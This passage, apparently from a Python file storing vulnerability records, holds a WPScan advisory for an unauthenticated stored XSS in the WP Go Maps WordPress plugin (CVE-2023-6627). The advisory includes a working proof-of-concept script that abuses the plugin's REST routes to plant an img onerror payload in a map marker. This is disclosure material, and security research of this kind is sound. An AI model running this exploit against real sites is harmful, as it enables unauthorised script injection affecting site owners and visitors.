Description
\t\t\tThe plugin does not properly protect most of its REST API routes, which attackers can abuse to store malicious HTML/Javascript on the site."""
full_description = '''WordPress Plugin Vulnerabilities WP Go Maps < 9.0.28 - Unauthenticated Stored XSS Description The plugin does not properly protect most of its REST API routes, which attackers can abuse to store malicious HTML/Javascript on the site. Proof of Concept Run the following Python script, then visit https://vulnerable-site.tld/wp-admin/admin.php?page=wp-google-maps-menu&action=edit&map_id=1. Alternatively, visit the page where the map is displayed after the fact and click on the affected marker to trigger the XSS. ``` import sys import requests if len(sys.argv) != 2: print(f'{sys.argv[0]} <target_site_root_url>') sys.exit() url = sys.argv[1].rstrip('/') # Get list of existing markers res = requests.get(f'{url}/wp-json/wpgmza/v1/markers').json() if len(res) == 0: print('# No markers found! Make sure the plugin is properly setup.') sys.exit() marker_id = res[0]['id'] print(f'# Found marker ID #{marker_id}, using it to demonstrate the exploit') print('# Tricking the POST section of the endpoint to store our XSS payload..') body = { 'address': '<img src="x&quot; onerror=alert(&quot;xss&quot;)//">' } requests.post(f'{url}/wp-json/wpgmzA/v1/markers?_method=get&random=/wpgmza/v1/markers/{marker_id}', data=body) ``` Affects Plugins wp-google-maps Fixed in 9.0.28 References CVE CVE-2023-6627 URL https://wpscan.com/blog/stored-xss-fixed-in-wp-go-maps-9-0-28/ Classification Type XSS OWASP top 10 A7: Cross-Site Scripting (XSS) CWE CWE-79 CVSS 8.8 (high) Miscellaneous Original Researcher Marc Montpas Submitter Marc Montpas Submitter website https://wpscan.com Submitter twitter marcS0H Verified Yes WPVDB ID f5687d0e-98ca-4449-98d6-7170c97c8f54 Timeline Publicly Published 2023-12-12 (about 1 year ago) Added 2023-12-12 (about 1 year ago) Last Updated 2023-12-12 (about 1 year ago) Other Published Title Published 2025-01-07 Title Better User Shortcodes <= 1.0 - Reflected Cross-Site Scripting Published 2024-07-02 Title WP Lightbox 2 < 3.0.6.7 - Authenticated (Contributor+) DOM-Based Stored Cross-Site Scripting Published 2020-01-29 Title Elementor Page Builder < 2.7.7 - Authenticated Stored XSS Published 2024-11-21 Title LearnPress < 4.2.7.2 - Admin+ Stored XSS Published 2024-09-30 Title XLTab – Accordions and Tabs for Elementor Page Builder < 1.4 - Authenticated (Contributor+) Stored Cross-Site Scripting'''
